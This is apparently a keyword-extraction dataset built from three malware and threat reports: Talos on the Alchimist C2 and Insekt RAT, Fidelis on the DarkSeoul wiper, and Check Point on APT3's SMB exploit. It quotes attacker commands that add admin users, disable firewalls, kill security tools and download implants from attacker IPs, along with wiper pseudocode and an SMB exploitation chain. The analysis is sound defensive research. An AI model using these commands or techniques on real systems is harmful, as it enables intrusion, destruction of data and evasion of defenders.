remote execution.The C2 address is hard-coded on the implant at configuration time, which attempts to connect to the C2 server 10 times with an interval of one second. After ten unsuccessful attempts, the backdoor pauses and again attempts to connect to the C2 server once every hour.Implant initiating the connection to the C2 server.The implant supports connecting to the C2 over either WSS/WS, TLS or SNI protocols.8/19Communication mechanisms for various protocols.Based on the C2 URLs specified, the implant will use a specific protocol to initiate the check-in with the C2 server.9/19Implant selects the right protocol to check in and talk to the C2.Insekt implantInsekt is a 64-bit implant written in GoLang, compiled for Windows and Linux environments with a variety of RAT capabilities, all directed to execute by the Alchimist C2 server.During initialization, the implant will set up multiple handlers for seven primary capabilities:Get file sizes. Get OS information. Run arbitrary commands via cmd[.]exe. Upgrade the current Insekt implant. Run arbitrary commands as a different user. Sleep for periods of time defined by the C2. Start/stop taking screenshots.10/1911/19Major Insekt capabilities.Insekt also checks the internet connectivity and port status by connecting to the addresses/ports below.Hostlocalhost www[.]google[.]com www[.]apple[.]com 443Apart from these capabilities, the implant consists of other capabilities such as shellcode execution, port and IP scanning, SSH key manipulation, proxying connections, etc. described below. Both variants can execute arbitrary commands on the operating system shell, upon request from the operators.The Linux variant of Insekt also has the functionality to list the contents of "".ssh"" directory in the victim's home directory and adds new SSH keys to the authorised_Keys file. Using this feature, the attacker can communicate with the victim's machine from the C2 over SSH.12/19From the network point-of-view, Insekt can create ""proxy"" connections to other systems by its own mechanism or by simply using the socks5 protocol.Insekt also includes a module that implements the different commands that can be issued by the operators. In particular, it implements interactive shells based on PowerShell, bash and cmd[.]exe. It also has the ability to accept command codes from the Alchimist C2 to execute a predefined set of commands on the victim system. The table below lists such commands.CommandAction${add_user}${add_admin}net user add {user} /random /addnet localgroup administrators {user} /addDescription Creates a user [T1136]13/19CommandAction${domain_ls}net user /domain${domain_show}net group ""domain admins"" /domain${dc}net group ""domain controllers"" /domain${2003_rdp_reg}“hklm/system/CurrentControlSet/Control/Terminal Server"" /v fDenyTSConnections${close_firewall}netsh firewall set opmode mode=disable${in-port-allow-tcp}netsh advfirewall firewall add rule name=\""Allow port\"" dir=in action=allow protocol=TCP localport={port}DescriptionList users in rules to allow incoming connections on a specific tcp port [T1562/004]A module named ""Command Line Interface (CLI)"" in Insekt contains RAT styled capability implementations — command codes and data received from the C2 — for carrying out specific RAT actions on the infected endpoint. These capabilities consist of:Change directory - cd. Write files to disk. Execute arbitrary commands. Scan IPs. Scan specific ports for an IP. Enumerate file in a directory path. Download files from a remote location. Unzip archive files to a location on disk.RAT command indexes and decision tree.14/19Other toolsAlong with Alchimist, Cisco Talos also found tools for the elevation of privileges and eventual exploitation of MacOSX platforms. Talos found two tools whose source code can be found on GitHub: Fast reverse proxy (frp), which can be used for data exfiltration and Fscan, an intranet-scanning tool.MacOSX exploitationThe Mach-O file discovered in the open directory is a 64-bit executable written in GoLang embedded with an exploit and a bind shell backdoor. The dropper contains an exploit for a privilege escalation vulnerability (CVE-2021-4034) in polkit's pkexec utility. However, this utility is not installed on MacOSX by default, meaning the elevation of privileges is not guaranteed. Along with the exploit, the dropper would bind a shell to a port providing the operators with a remote shell on the victim machine. The same exploit was also found for Linux.ScriptletAlchimist can generate scripts to be used in the first stage of infections. One of these scripts was found with the name ""down[.]sct."" The script launches a WScript[.]shell object to run a PowerShell command and download the Insekt implant from http[://]45[.]32[.]132[.]166/msconfig[.]zip.ShellcodeA meterpreter shellcode was found on a file with the name shell.msi. It has the malicious configuration containing the host and the port details for the shell code to connect to 18[.]167[.]90[.]252, providing Talos with one more piece of the operator's infrastructure.Infrastructure Malicious InfrastructureThe web archive scans report of the host 45[.]32[.]132[.]166 showed us that it had an open directory in discovered five hosts containing the same certificate:149[.]28[.]54[.]212 95[.]179[.]246[.]73 149[.]28[.]36[.]160 45[.]76[.]68[.]112 3[.]86[.]255[.]8Our analysis revealed that the backdoors communicated over HTTPS to the server 149[.]28[.]54[.]212 and the Alchimist user interface was accessible via ports 8443 and 50423 from the servers 149[.]28[.]54[.]212, 95[.]179[.]246[.]73, and 149[.]28[.]36[.]160.The rise of all-inclusive C2 frameworksOur discovery of Alchimist is yet another indication that threat actors are rapidly adopting off-the-shelf C2 frameworks to carry out their operations. A similar ready-to-go C2 framework called ""Manjusaka'' was recently disclosed by Talos. Alchimist also comprises a single-file based, ready-to-go C2 tool along with its remote access tool Insekt, implemented in GoLang and compiled to target Windows and Linux machines.The functionality of Manjusaka and Alchimist's web interfaces exhibiting remote administration capabilities, performed through the RATs, signifies the plethora of functionalities packed into these C216/19frameworks. A threat actor gaining privileged shell access on a victim's machine is like having a Swiss Army knife, enabling the execution of arbitrary commands or shellcodes in the victim's environment, resulting in significant effects on the target organization.Endpoint security teams should implement layered security defense, be constantly vigilant in monitoring the privileged operations in their environments and detect any unauthorized programs attempting to gain root privileges. Network security teams should be looking for any unusual traffic to their organizations' environment and be cautious about suspicious artifacts downloaded to their network. Having controlled download and file execution policies on the endpoints and servers can effectively protect organizational assets from threats.Organizations and users who are using the vulnerable versions of polkits pkexec utilities should patch their systems following the mitigation steps as advised by RedHat. For the users of Unix-like systems other than Linux, who cannot find patches for their operating systems, a workaround could be implemented by removing the SUID-bit of pkexec utility.CoverageWays our customers can detect and block this threat are listed below.17/19Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. Additional protections with context to your specific environment and threat data are available from the18/19Firewall Management Center. Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.The following ClamAV signatures have been released to detect this threat:Osx.Exploit.CVE_2021_4034-9951522-2 Unix.Exploit.CVE_2021_4034-9951523-0 Unix.Exploit.CVE_2021_4034-9951524-0 Unix.Exploit.CVE_2021_4034-9951525-0 Unix.Exploit.CVE_2021_4034-9951526-0 Unix.Malware.Insekt-9955436-0 Win.Malware.Insekt-9955440-0 Unix.Malware.Alchimist-9955784-0 Multios.Malware.Insekt-9961177-0Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort SIDs for this threat are 58955 - 58956. IOCsThe IOC list is available in Talos' Github repo here.19/19 ","{'phrases': ['the attacker', 'the Alchimist C2 server', 'Insekt payloads', 'assets', 'time', 'access', 'UI', 'the Insekt payload', 'victims', 'machines', 'commands', 'control', 'actions', 'execution', 'capture', 'file', 'RAT', 'Data', '10', 'lateral movement', 'exploitation', 'other tools'], 'target': 'the attacker; the Alchimist C2 server; Insekt payloads; assets; time; access; UI; the Insekt payload; victims; machines; commands; control; actions; execution; capture; file; RAT; Data; 10; lateral movement; exploitation; other tools.'}"
the malware; disk access; The physical drive; a file; a wiper; the wiper; the MBR; the VBR; the malware; details; edi; eesi; the wiper; the system; the data; 0x8000; the VBR; the system; 0x006; 0x1007; the data; the system.,"[' 1. The malware gains disk access by opening the physical drive as a file. 2. It first overwrites the volume boot record (VBR) location at sector 56, which is the location on XP systems. 3. It then continues overwriting data in a loop using 512 byte patterns on XP and 1023 byte patterns on Windows 7. 4. The malware creates threads to overwrite all fixed drives it finds on the system. 5. It runs commands to kill security processes AhnLab Policy Agent and ViRobot ISMS. 6. It then runs a command to reboot the system quickly. 7. The wiping process happens rapidly, in 10-15 minutes. 8. The malware overwrites enough data to make the system unusable but does not wipe all data. 9. Using forensic tools like EnCase, the backup VBR can be recovered to restore the file system. 10. The MBR can also be repaired manually with a hex editor to boot the system, though some corruption will remain. ']","Extract the keywords: www.fidelissecurity.com www.threatgeek.com @FidSecSys +1800.652.4020Fidelis Threat Advisory #1008Darkseoul/Jokra Analysis And RecoveryMarch 21, 2013Document Status: FINALLast Revised: 2013-03-21A recent cyber-attack reported within the South Korean broadcasting and banking infrastructure reportedly brought down over 35,000 systems. This attack has drawn comparisons in intent and method to the recent wiping attack against Saudi Aramco by the Shamoon malware. Shamoon has been covered extensively by the community, and was covered in Fidelis Threat Advisory #1007. Naturally our curiosity was peaked and we acquired samples of the malware and started analysis. The initial analysis has been posted on the Fidelis Threat Geek blog and will be expanded upon in this advisory. This write-up will focus on the wiper malware used and the recovery techniques that are possible. From preliminary analysis it is known that the malware will overwrite the Master Boot Record (MBR) and Volume Boot Record (VBR). The records and files overwritten by the malware so far have been wiped with patterns of 'HASTATI' or 'PR!NCPES’. The malware samples that have been analyzed by our team are different in code and function from the Shamoon malware. However, by using the same recovery methods found in advisory #1007 the files and data are indeed recoverable. Wiper Malware Overview Two malware samples obtained were used in the analysis. The malware has been named 'DarkSeoul' and 'Jokra' by the community. Our samples have been touched on in our blog entry and other samples have been covered in blogs around the community.239ed75323.exe: document cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Security Systems, Inc. While we have done our best to ensure that the material found in this document is accurate, Fidelis Security Systems, Inc. makes no guarantee that the information contained herein is error free. Copyright © 2013 General Dynamics Fidelis Cybersecurity Systems Threat Advisory #1008 Page 1 of 5Rev. 2013-02-21 Darkseoul/Jokra Analysis And RecoveryThe malware gains disk access by opening the physical drive as a file.www.fidelissecurity.com www.threatgeek.com @FidSecSys +1800.652.4020Disk Access (Func 00401d55): sprintf(filename_str, ""\\.\PhysicalDrive%d"", 0) hFile = CreateFileA(filename_str, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL)Example of the wiper opening the drive as a file.The first section that the malware overwrites is located at 0x7000. This is sector 56 and is normally the VBR location of a Windows XP system. It continues the pattern of 'HASTATI' or 'PR!NCPES’' for 102,400d bytes. Wiper Selection (Func 00402079): and [local.1], 0 ;(local.1->""PR!NCPES"") mov esi,[arg.2] ;arg.2 = 0x38 on first call eax=0 shld eax,esi,9 mov edi,[arg.1] mov [arg.2], eax lea eax, [arg.2] shl esi,9 SetFilePointer(hFile, esi, eax, FILE_BEGIN) // on first call -- 0x009efab8:0x00007000 WriteFile(hFile, &arg.3, 512, &local.1, NULL) If this is hardcoded for 0x7000 then it will not wipe the VBR of any systems after and including Vista, as those VBR locations are in different areas. During testing both malware samples were executed in a Windows 7 VM. Neither wiped the MBR or the VBR—they only overwrote files within the file system—but the system wasn't prevented from starting up. The malware writes a 512-byte pattern to the disk in XP and a 1023 byte pattern in Windows 7.Example of how the wiper selected the location to overwrite on the first call.Example of the loop responsible for overwriting the disk and files.As observed during a debugging session the following screenshot shows one of the 512-byte patterns it writes to disk:Copyright © 2013 General Dynamics Fidelis Cybersecurity Systems Threat Advisory #1008 Page 2 of 5Rev. 2013-02-21 Darkseoul/Jokra Analysis And Recoverywww.fidelissecurity.com www.threatgeek.com @FidSecSys +1800.652.4020Example of overwritten diskThe malware will create new threads for each physical drive found on the affected system. It enumerates and tries to find PhysicalDrive[0-9]. The malware makes distinctions based on what type of drive is detected, such as fixed or removable devices. As long as the drive is fixed a new thread is created.Thread 1 (Func 00401aa0):call func_00401d55 strcpy(drive_path, ""B:\"") if (GetDriveType(drive_path) == DRIVE_FIXED) CreateThread(NULL, 0, 00401B7A, 0040247C, 0, &tid) Example of the wiper finds fixed drives and create new thread for each drive.The following commands have previously been reported in the community:“taskkill /F /IM pasvc.exe” “taskkill /F /IM Clisvc.exe” ""shutdown -r -t 0""Example of commands run by the malware.The first command, “taskkill /F /IM pasvc.exe”, will try to kill a process named “pasvc.exe”. This process is associated with the AhnLab Policy Agent process.Copyright © 2013 General Dynamics Fidelis Cybersecurity Systems Threat Advisory #1008 Page 3 of 5Rev. 2013-02-21 Darkseoul/Jokra Analysis And Recoverywww.fidelissecurity.com www.threatgeek.com @FidSecSys +1800.652.4020The second command, “taskkill /F /IM Clisvc.exe”, will try to kill a process named “Clisvc.exe”. This process is associated with the ViRobot ISMS security tool from HAURI Inc. The third command, “shutdown -r -t 0”, instructs the malware to shutdown and reboot the system. The malware shuts the system down quickly after initial execution, it was found to finish wiping in ten to fifteen minutes in our tests. Due to the speed of the wiping it was very easy to find that the malware did not actually wipe all the data on the computer. It wiped just enough to make the machine unusable after the operation was complete. This is notable and can be seen in the operation of the malware as it makes sure to overwrite the VBR first then continue overwriting the MBR and other files. Note: The sample Fidelis Security Systems researchers had available looked very similar to that detailed in community write-ups. However, as of the date of this post, researchers were still analyzing the available sample. Therefore, differences between the available sample and others available to the community may become apparent in the future. File System Recovery The following is the view of the wiped disk for each of the operating systems that we tested:Example of wiped MBR by the Malware.The malware never actually overwrote the backup VBR. It was found that the same techniques utilized to recover data from Shamoon could be applied here. The recovery methods were covered in depth in Fidelis Threat Advisory #1007 so we will not show them here. What will be shown are the results of the recovery. When the backup VBR is found within EnCase (v6.19.6) it was possible to add a manual NTFS partition into the system to recover the file system and data within.Copyright © 2013 General Dynamics Fidelis Cybersecurity Systems Threat Advisory #1008 Page 4 of 5Rev. 2013-02-21 Darkseoul/Jokra Analysis And Recoverywww.fidelissecurity.com www.threatgeek.com @FidSecSys +1800.652.4020Example of a file system recoveredOnce the logical file system is recovered relevant forensic artifacts can be located. It will be important to note that a lot of files will be recoverable and a lot of system files are left untouched. The wiper corrupts file systems very quickly, but the expense of this is leaving more files untouched and recoverable. Note: When multiple partitions are suspected then it will be likely the recovery will need to be done manually with a hex editor. The method for this was also covered in advisory #1007. Using a hex editor it is possible to repair an image with the backup VBR and build a new MBR to boot the affected computer. This comes with a warning, just being able to boot the machine and accessing the data within doesn't mean that system will operate properly. The system still has files that were corrupted by the malware, and some of those files will affect the user experience. However, in our testing we were able to rebuild the MBR and recover the VBR to boot the affected system. Our repaired system was missing the start button and a few of the shortcuts to executables on the desktop were no longer functioning. The XP system when repaired always asked to complete a chkdisk cycle, and on the whole didn’t operate normally. The Windows 7 systems that were affected by the two malware samples did not experience these issues, and appeared to operate normally. Attempts to repair the XP system with the windows recovery CD always ended in a bluescreen error before the operation finished any repairing. The Fidelis Take Fidelis XPS sensors detect the DarkSeoul/Jokra malware as it enters the network as ""Trojan.Win32.EraseMBR.b"". Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the Threat Actors responsible. Fidelis XPS can detect and alert on executables such as the DarkSeoul malware multiple layers deep inside of zip files, or even XOR'ed inside of a weaponized MS Office document or Adobe PDF File. The Fidelis Threat Research and Network Forensics and Incident Response teams will continue to actively monitor the ever-evolving threat landscape for the latest threats to our customers network security.Copyright © 2013 General Dynamics Fidelis Cybersecurity Systems Threat Advisory #1008 Page 5 of 5Rev. 2013-02-21 Darkseoul/Jokra Analysis And Recovery ","{'phrases': ['the physical drive', 'a file', 'first', 'Volume Boot Record', 'sector', '56', 'the location', 'XP', 'data', '512', 'patterns', '1023', 'Windows 7', 'threads', 'fixed drives', 'the system', 'commands', 'ViRobot ISMS', 'the wiping', 'the malware overwrites', 'EnCase', 'the backup VBR', 'the file system', 'the MBR', 'a hex editor'], 'target': 'the physical drive; a file; first; Volume Boot Record; sector; 56; the location; XP; data; 512; patterns; 1023; Windows 7; threads; fixed drives; the system; commands; ViRobot ISMS; the wiping; the malware overwrites; EnCase; the backup VBR; the file system; the MBR; a hex editor.'}"
APT3; the exploit; 0-day; Windows; the group; the exploit; a 0-day info leak; the network; logs; 0-day exploits; the exploit; code; SMB; vulnerabilities; data; the exploit; the kernel; memory; the group; anti-analysis checks; analysis; the group; the attack; time.,"["" 1. Bemstour establishes an SMB connection to the victim and sends malformed packets to trigger a type confusion vulnerability, similar to EternalRomance. 2. This results in an out-of-bounds write primitive that Bemstour utilizes to overwrite data. 3. Bemstour uses a 0-day info leak vulnerability to disclose the address of a kernel object called CCB. 4. Using the write primitive from step 2, Bemstour overwrites a function pointer in the CCB to point to shellcode. 5. When the SMB connection is closed, the overwritten destructor function is called, executing Bemstour's shellcode. 6. The shellcode decrypts and executes DoublePulsar, setting up a hook for invalid SMB commands. 7. Further payloads can be sent via SMB and injected into processes using DoublePulsar. ""]","Extract the keywords: 9/6/2019UPSynergy: Chinese-American Spy vs. Spy Story - Check Point ResearchUPSynergy: Chinese-American Spy vs. Spy Storyresearch.checkpoint.com/upsynergySeptember 5, 2019September 5, 2019 Research By: Mark Lechtik & Nadav GrossmanIntroductionEarlier this year, our colleagues at Symantec uncovered an interesting story about the use of Equation group exploitation tools by an alleged Chinese group named Buckeye (a.k.a APT3, or UPS team). One of the key ﬁndings in their publication was that variants of the Equation tools were used by the group prior to ‘The Shadow Brokers’ public leak in 2017. Moreover, it seems that APT3 developed its own in-house capabilities and equipped its attack tool with a 0-day that targeted the Windows operating system.Following these revelations, we decided to expand on Symantec’s ﬁndings and take a deeper look at Bemstour, the group’s exploitation tool. In our analysis, we try to understand the background environment in which it was created, and provide our perspective of how it was developed. Our observations from the technical analysis allow us to provide evidence for a speculation that was formerly suggested by Symantec – APT3 recreated its own version of an Equation group exploit using captured network trafﬁc. We believe that this artifact was collected during an attack conducted by the Equation group against a network monitored by APT3, allowing it to enhance its exploit arsenal with a fraction of the resources required to build the original tool.APT3 is known to be a long-standing and sophisticated threat actor, having a record of using advanced TTPs, such as leveraging zero day exploits in its attacks. Such capabilities are consistent with former research by Intrusion Truth and Recorded Future, stating that the entity behind APT3 is the Chinese Ministry of State Security. That said, it wasn’t very clear so farurl Chinese-American Spy vs. Spy Story - Check Point Researchwhether the group developed its exploits in-house or acquired them elsewhere. In this publication we deliver a glance into one possible modus operandi – the Chinese collect attack tools used against them, reverse engineer and reconstruct them to create equally strong digital weapons.Following is a summary of our key ﬁndings:The group’s exploitation tool named Bemstour makes use of a variant of a single Equation group exploit. Our research shows that the particular equivalent to this exploit is EternalRomance. APT3 developed their own implementation, possibly based on their analysis and understanding of EternalRomance’s leveraged vulnerability. The group attempted to develop the exploit in a way that allowed it to target more Windows versions, similar to what was done in a parallel Equation group exploit named EternalSynergy. This required looking for an additional 0-day that provided them with a kernel information leak. All of this activity suggests that the group was not exposed to an actual NSA exploitation tool, as they would then not need to create another 0-day exploit. We decided to name APT3’s bundle of exploits UPSynergy, since, much like in the case of Equation group, it combines 2 different exploits to expand the support to newer operating systems. The underlying SMB packets used throughout the tool execution were crafted manually by the developers, rather than generated using a third party library. As a lot of these packets were assigned with hardcoded and seemingly arbitrary data, as well as the existence of other unique hardcoded SMB artifacts, we can assume that the developers were trying to recreate the exploit based on previously recorded trafﬁc. If network trafﬁc was indeed used by the group as a reference, the trafﬁc was likely collected from a machine controlled by APT3. This means either a Chinese machine that was targeted by the NSA and monitored by the group, or a machine compromised by the group beforehand on which foreign activity was noticed. We believe the former is more likely, and in that case could be made possible by capturing lateral movement within a victim network targeted by the Equation group. Finding a 0-day info leak, recreating the exploit based on the aforementioned vulnerability, and utilizing a lot of internal undocumented structures of SMB in the implants, implies that there was a similar expertise with and analysis performed on SMB drivers (with an eye to exploiting them) on the Chinese side, roughly at the same time it was widely used by the NSA. This, to some extent, suggests a narrative where China and the US are engaged in a cyber arms race to develop new exploits.In the following sections, we provide the technical basis for our conclusions, by taking a tour through the tool’s internals, its underlying exploit, and the implant’s nuts and bolts. We also dive deeply into the root cause for the 0-day found by APT3. To the best of our knowledge, this hasn’t been described anywhere else.Overview of the Bemstour ToolBesmtour is a tool developed by APT3 to gain remote code execution on a victim’s machine using UPSynergy – a combination of an exploit based on EternalRomance and a 0-day found by the group itself. The goal is to deploy a payload on the victim’s machine which is injected to a running process using an implant. This implant is highly similar to the Equation group’s DoublePulsar.The tool is meant to be run from a command line, and provides 2 modes of operation. In the ﬁrst, the attacker sends a local ﬁle which will be executed on the victim machine with a given command line argument. In the 2nd mode, the attacker runs an arbitrary shell command without the need to send an actual ﬁle.url Chinese-American Spy vs. Spy Story - Check Point ResearchThese functionalities are supported in both 32 and 64 bit versions. According to Symantec, the 64 bit versions were leveraged solely for executing shell commands, mostly to generate new user accounts in the victims’ environments.Figure 1: The 2 modes of operation provided by Bemstour.One thing we noted about Bemstour’s code is the way it generates and sends trafﬁc to the victim’s machine. In particular, we noticed that all packets are built manually, i.e. the developers created structs to represent the various SMB packets to send to the victim, and issued them over plain TCP sockets.Figure 2: An example of a manually constructed SMB header.As part of the manual crafting of SMBs, the developers assigned them with values hardcoded in the binary. Some of these reside within the data section in the form of custom structs, such as the one depicted in the ﬁgure below. When such a hardcoded assignment is required, an allocated SMB and the hardcoded structure are issued as arguments to a speciﬁc function, which in turn takes the custom struct’s ﬁeld values and assigns them to the corresponding SMB ﬁelds.Figure 3: A custom structure containing ﬁelds to populate SMB headers with hardcoded values.When looking at a structure like this, it’s noteworthy that some of its ﬁelds represent unique values that are generated per SMB connection. One such value is the UID, which can be declared by the client and therefore could be chosen arbitrarily by Bemstour. In this case, there are multiple instances where this ﬁeld is given hardcoded unique values in a particular range, which may hint that they were copied from a source like recorded network trafﬁc.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 4: Instances of the custom hardcoded SMB header structure.We found other hardcoded structures that are actually not used in any place in the code, but whose values and order imply the ﬁeld they represent. This suggests that these are header fragments that were left as residues in the binary from another source. An example of such structs is shown below, where a numeric proximity can be seen to those UIDs that are used in the code.Figure 5: Unused fragments of SMB header that are left in the binary.There are additional hardcoded artifacts that may provide some insight into the tool’s nature. For example, the PDB path (seen in the ﬁgure below) points out that the tool’s source name is “SMB Master”, and it was part of a project called “SMB_FOR_ALL_Ultimate-signature.” Based on this,url Chinese-American Spy vs. Spy Story - Check Point Researchwe can speculate that the project was indeed about repurposing an SMB exploit to target “ALL” (or at least more) versions of Windows.Figure 6: PDB path hardcoded in the tool’s binary.Finally, more unused strings show something that looks like a concatenation of a computer name, user name and perhaps domain name. It is unclear where they come from, but again, strengthens the idea that this network entity was part of a referenced trafﬁc capture.Figure 7: Unused strings that reveal a network entity.Overview of the Eternal* ExploitsBefore we take a further look at the details of APT3’s exploit implementation, we need to understand the various Eternal exploits that were incorporated into the Lost in Translation leak by The Shadow Brokers. Back in 2017, when this leak was released, 4 Eternal exploits were uncovered: EternalBlue, EternalChampion, EternalRomance and EternalSynergy.Both and EternalRomance targeted mostly Windows 7 systems (as well as lower version of Windows NT where SMBv1 is located). One of the problems in adapting EternalRomance to higher Windows versions was a patch introduced in Windows 8 which eliminated the possibility to use an information leak vulnerability leveraged by it.To deal with this problem, the Equation group came up with an upgraded version where the problematic info leak was replaced with one that could be exploited on Windows 8. Essentially, there was nothing new there, as the info leak exploit was already used in EternalChampion and other parts of EternalRomance remained the same. This new hybrid exploit was named EternalSynergy, suggesting the way it was built – a synergy of 2 exploits.When it comes to the exploit in the Bemstour tool, it is evident that there’s an attempt to leverage the same vulnerability exploited by EternalRomance. At the same time, there is the use of a whole new information leak exploit, which was in fact a 0-day found by APT3. As we will see in the upcoming section, this particular information leak is quite robust and allowed the group to upgrade their version of EternalRomance to use in versions higher than Windows 7.In this sense, APT3 crafted its own exploit from other exploits – a tactic very similar to one used by the Equation group. As this threat group also uses the name UPS team, we decided to name their version of the exploit bundle UPSynergy.Root Cause Analysis of CVE 2019-0703According to Microsoft, CVE-2019-0703 is “an information disclosure vulnerability [that] exists in the way […] the Windows SMB Server handles certain requests. An authenticated attacker who successfully exploited this vulnerability could craft a special packet, which could lead to information disclosure from the server.url exploit the vulnerability, an attacker would have to be able to authenticate and send SMB messages to an impacted Windows SMB Server The security update addresses the vulnerability by correcting how Windows SMB Server handles authenticated requests ”5/249/6/2019UPSynergy: Chinese-American Spy vs. Spy Story - Check Point ResearchOur analysis shows a slightly different picture. The vulnerability is in fact a logical bug related to querying information from the Windows Named Pipes mechanism, and not a vulnerabilityin the SMB protocol nor its implementation. While it can be triggered using SMB, there are other ways to leverage it, e.g. using the NtQueryInformationFile Windows API call that is unrelated to SMB.The bug resides within npfs.sys (Name Pipe File System driver) in a function named NpQueryInternalInfo. The latter is used to query named pipes and return a value called a ﬁle reference number, which according to Microsoft “MUST be assigned by the ﬁle system and is unique to the volume on which the ﬁle or directory is located.”However, our analysis shows that the returned value is not a ﬁle reference number, but rather a pointer to a kernel structure named CCB (Client Control Block). This is an undocumented struct deﬁned in npfs.sys, which has a partial deﬁnition (named NP_CCB) provided by the ReactOS project. Clearly, this is not the intended value to be returned in this case, and the leak of this struct discloses useful information that can be leveraged by attackers.Figure 8: The leaked object is in fact a CCB struct, as evident from WinDbg.To trigger this information disclosure vulnerability, a call with the following arguments is made to the NtQueryInformationFile stub in ntdll.dll:FileHandle – Handle to a named pipe (for example “\\.\pipe\browser”). FileInformationClass – FileInternalInformation (equals 0x6).After this happens, we get the following call stack:Figure 9: Kernel mode call stack corresponding to an NtQueryInformationFile call from user mode.As already mentioned, it is also possible to trigger this vulnerability via SMB, as was used by APT3. The method was used to determine the bitness of the attacked operating system and overwrite (using a write primitive) a ﬁeld in the leaked structure, which eventually provided the group with remote code execution.To leverage the vulnerability, you must ﬁrst establish an SMB connection to a named pipe on the victim’s machine, as can be seen in the ﬁgure below.url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 10: Network capture of SMB packets that demonstrates an establishment of a connection to the \pipe\browser named pipe (FID 0x4000).Next, it’s possible to query information about the opened pipe using the 0x32 SMB command (SMB_COM_TRANSACTION2) and the 0x7 subcommand (TRANS2_QUERY_FILE_INFORMATION). The latter has a ﬁeld named InformationLevel which describes the types of information that can be retrieved by the server.Furthermore, if the server declared a capability named Infolevel Passthru in its Negotiate Response ﬁeld as a part of an earlier negotiation (a capability usually provided by default), more types of information can be retrieved, namely ones that provide native ﬁle information on the server. In this case, the former capability allows it to provide a code number named a Pass-thru Information Level by the client, which maps directly to another Windows NT numerical value called an Information Class on the server. This value corresponds to the FileInformationClass parameter of the NtQueryInformationFile API, which speciﬁes what type of ﬁle information to query from a server destined ﬁle object.To use one of the pass-thru Information Levels to request a corresponding Information Class for a ﬁle on the server, it is sufﬁcient to add the value 0x3e8 (SMB_INFO_PASSTHROUGH) to the requested Information Class. As an example, if we take the FileInternalInformation Information Class (which has the value 6) and want to get the corresponding Information Level, we just need to add the previously mentioned value to it, resulting in the value 0x3ee.In our case, using this very same Information Level by placing it as a parameter of the TRANS2_QUERY_FILE_INFORMATION subcommand, triggers the vulnerability by causing the invocation of the NtQueryInformationFile from the srv.sys driver (SMB driver). The latter in turn calls the vulnerable NpQueryInternalInfo from npfs.sys, as depicted in the stack trace below.Figure 11: Kernel mode calls stack resulting from execution of the SMB transaction that triggers the bug.Consequently, when we issue a Trans2 request to query for a ﬁle info using the previously mentioned Info Level, we get a CCB leaked pointer in the response.Figure 12: Wireshark’s view of triggering the vulnerability.To examine the described root cause for the vulnerability from another angle, we can take a look at the diff between the patched and unpatched code in npfs.sys:url Chinese-American Spy vs. Spy Story - Check Point ResearchFigure 13: Patch diff – The vulnerable code can be seen in the upper part.As can be seen in the vulnerable code, the out_buffer argument returned to the caller and then to the client contains a pointer to the ClientControlBlock (NP_CCB) argument instead of the ﬁle reference number. This is ﬁxed in the patched code, where offsets 0xa0 and 0xa4 from ClientControlBlock are written to the out_buffer instead, thus returning the actual intended ﬁle reference number to the caller and client.As mentioned previously, the information obtained from this info leak can give us the ability to execute code on the victim machine, using another write primitive. To understand how this is possible, we need to take a closer look at the CCB structure. One of its members points to yet another undocumented struct, which we will denote as ‘struct x’. This struct contains a pointer to a function that is called when the connection to the named pipe is terminated, which we’ll refer to as the ‘pipe destructor function’.In APT3’s implementation of the exploit, the HAL heap is written with both shellcode and a rogue instance of ‘struct x’. The latter simply contains a pointer to the shellcode in the position of the ‘pipe destructor function’. Therefore, when we use a write primitive and know the whereabouts of the leaked CCB structure, we can overwrite its pointer to ‘struct x’ so that it points to the rogue instance. After the connection is closed, the shellcode is triggered and the attacker can run arbitrary code on the victim’s machine.Comparison of UPSynergy and Eternal Romance ImplementationsOne of the observations we made during our analysis of Bemstour was that its main exploit targets only a particular vulnerability that overlaps with one used by the Equation group. This vulnerability is rooted in a type confusion bug leveraged in a similar fashion in the EternalRomance exploit, which was then reused together with other exploits in EternalSynergy.As a result of this type confusion between SMB messages, the server considers an unrelated SMB message as part of an SMB Transaction of a different type, and activates the wrong type of SMB handler. This handler in turn shifts the Transaction struct’s pointer to the incoming data buffer by the amount of data received in the SMB message. Because the pointer value was shifted by the wrong handler, data of further SMB messages (which are treated by the correct type of handler) can be potentially written outside the boundaries of the incoming data buffer. If there was successful grooming (i.e. the heap was correctly shaped beforehand), this out-of-bound write may allow us to overwrite an adjacent SMB Transaction structure.url Chinese-American Spy vs. Spy Story - Check Point ResearchInstead of going through every detail of APT3’s exploit, the table below compares the underlying techniques used by EternalRomance vs. those used by UPSynergy. Detailed information about the bug (CVE-2017-0143) and how it was exploited in EternalRomance to gain a write-what- where and read-what-where primitives is explained very well by Microsoft in their analysis of tionEternalRomanceAPT3 Exploit (UPSynergy)Determined from the server’s session SetupAndX re‐ sponse (part of a session negotiation), where the un‐ derlying target OS is speciﬁed. Uses a leaked pool header structure that contains parameters from which the OS architecture can be inferred.Uses 2 types of allocations with different sizes, named “bride” and “groom.” Another technique is used for OS versions prior to Windows 7.Same technique.Uses the address of the leaked CCB structure to infer the range in which it resides and the un‐ derlying architecture. Uses “bride” allocations only, with a different allocation size.Leaks a kernel object named Transaction (corre‐ sponding to an SMB Transaction). A result of a type confusion bug, as outlined above.Leaks a kernel object named CCB (Client Control Block). Same vulnerability.Can be achieved by overwriting the 